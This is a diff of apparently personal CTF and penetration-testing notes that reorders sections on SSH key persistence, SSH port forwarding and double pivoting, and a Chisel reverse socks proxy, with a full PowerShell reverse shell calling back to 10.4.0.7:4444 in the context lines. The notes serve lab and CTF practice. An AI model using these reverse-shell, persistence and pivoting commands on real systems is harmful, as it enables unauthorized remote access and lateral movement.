@@ -13,44 +13,7 @@ My [setup script](https://github.com/ChrisPritchard/ctf-writeups/blob/master/thm
 
 - [HackTricks by Carlos Polop](https://book.hacktricks.xyz/)
 - [Binary Exploitation notes](https://ir0nstone.gitbook.io/notes/)
-
-## Creating authorized keys
-
-1. create the `.ssh` folder using mkdir
-2. echo your public key into `.ssh/authorized_keys`
-3. `chmod 700 ~/.ssh`
-4. `chmod 600 ~/.ssh/authorized_keys`
-
-## SSH Proxies
-
-**local port forwarding**: the target host 192.168.0.100 is running a service on port 8888, and you want that service available on the localhost port 7777
-
-`ssh -L 7777:localhost:8888 user@192.168.0.100`
-
-**remote port forwarding**: you are running a service on localhost port 9999, and you want that service available on the target host 192.168.0.100 port 12340
-
-`ssh -R 12340:localhost:9999 user@192.168.0.100`
-
-**Local proxy** through remote host: You want to route network traffic through a remote host target.host, so you create a local socks proxy on port 12001 and configure the SOCKS5 settings to localhost:1080
-
-`ssh -C2qTnN -D 1080 user@target.host`
-
-(args above are compression level, quiet, run in background and no command should be run)
-
-**Double pivoting**, opening a socks proxy on a remote machine and forwarding that proxy so its accessible locally:
-
-`ssh -tt -L8080:localhost:8157 sean@10.11.1.251 ssh -t -D 8157 mario@10.1.1.1 -p 222`
-
-## Chisel reverse socks proxy
-
-Useful for pivoting, opens a socks proxy from the target to your attack box, basically so the attack box has a proxy to the target's network.
-
-1. Get chisel, via its release page: https://github.com/jpillora/chisel/releases/tag/v1.7.6
-2. Get a copy on the target and the attack box. 
-3. Create a server on the attack box: `./chisel server -p 1337 --reverse &`
-4. From the target, connect to the attack box via `./chisel client ATTACK-BOX-IP:1337 R:socks &`
-
-This will open a proxy on 1080, which you can then setup via proxychains etc.
+- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
 
 ## Reverse shells
 
@@ -128,6 +91,44 @@ powershell reverse shell!
 ```
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.4.0.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
+
+## Creating authorized keys
+
+1. create the `.ssh` folder using mkdir
+2. echo your public key into `.ssh/authorized_keys`
+3. `chmod 700 ~/.ssh`
+4. `chmod 600 ~/.ssh/authorized_keys`
+
+## SSH Proxies
+
+**local port forwarding**: the target host 192.168.0.100 is running a service on port 8888, and you want that service available on the localhost port 7777
+
+`ssh -L 7777:localhost:8888 user@192.168.0.100`
+
+**remote port forwarding**: you are running a service on localhost port 9999, and you want that service available on the target host 192.168.0.100 port 12340
+
+`ssh -R 12340:localhost:9999 user@192.168.0.100`
+
+**Local proxy** through remote host: You want to route network traffic through a remote host target.host, so you create a local socks proxy on port 12001 and configure the SOCKS5 settings to localhost:1080
+
+`ssh -C2qTnN -D 1080 user@target.host`
+
+(args above are compression level, quiet, run in background and no command should be run)
+
+**Double pivoting**, opening a socks proxy on a remote machine and forwarding that proxy so its accessible locally:
+
+`ssh -tt -L8080:localhost:8157 sean@10.11.1.251 ssh -t -D 8157 mario@10.1.1.1 -p 222`
+
+## Chisel reverse socks proxy
+
+Useful for pivoting, opens a socks proxy from the target to your attack box, basically so the attack box has a proxy to the target's network.
+
+1. Get chisel, via its release page: https://github.com/jpillora/chisel/releases/tag/v1.7.6
+2. Get a copy on the target and the attack box. 
+3. Create a server on the attack box: `./chisel server -p 1337 --reverse &`
+4. From the target, connect to the attack box via `./chisel client ATTACK-BOX-IP:1337 R:socks &`
+
+This will open a proxy on 1080, which you can then setup via proxychains etc.
 
 ## Shell tricks
 
